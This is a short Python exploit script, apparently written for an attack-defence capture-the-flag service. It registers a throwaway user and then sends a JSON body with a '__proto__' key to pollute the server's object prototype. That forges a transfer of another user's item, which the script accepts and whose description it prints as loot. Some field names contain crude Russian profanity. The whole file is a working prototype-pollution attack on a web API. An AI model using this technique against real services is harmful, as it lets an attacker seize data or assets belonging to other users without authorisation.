#!/usr/bin/env python3

from checklib import *
import sys

ip = sys.argv[1]
attack_user = sys.argv[2]
attack_slave = sys.argv[3]

api = f"http://{ip}:3001/rychka"

u = rnd_username()
p = rnd_password()
s = get_initialized_session()

r = s.post(f"{api}/registraciya", json={
    'ктоНахуй': u,
    'пароль': p,
})

s.post(f"{api}/login", json={
    'ктоНахуй': u,
    'пароль': p,
})

s.post(f"{api}/sleiv/poimat", json={
    '__proto__': {
        'неПокажу': {
            'передать': True,
            'отКого': attack_user,
            'кому': u,
            'кого': attack_slave,
        }
    }
})

s.post(f"{api}/torg/prinyat", json={
    'отКого': attack_user,
    'кого': attack_slave,
})

r = s.get(f"{api}/polzovateli/ya")

print(r.json()['ok']['слейвы'][0]['описание'], flush=True)
